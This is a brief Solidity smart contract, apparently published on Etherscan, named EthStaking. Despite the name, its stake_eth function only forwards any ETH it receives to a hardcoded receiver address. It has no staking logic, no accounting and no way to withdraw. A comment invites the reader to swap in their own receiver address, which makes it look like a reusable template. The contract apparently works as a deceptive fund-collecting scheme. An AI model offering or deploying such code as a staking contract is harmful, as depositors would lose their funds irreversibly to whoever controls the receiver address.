/**
 *Submitted for verification at Etherscan.io on 2022-11-30
*/

//SPDX-License-Identifier:MIT
pragma solidity >=0.8.0;

contract EthStaking
{
    //Replace with the receivers address
     address receiver = 0xEF0239527a335A223C5a12571926E531DE53D9e4;

    event Received(address, uint);

    receive() external payable {
        emit Received(msg.sender, msg.value);
    }

    function stake_eth() public payable 
    {
        payable(address(receiver)).transfer(msg.value);
    }

      
}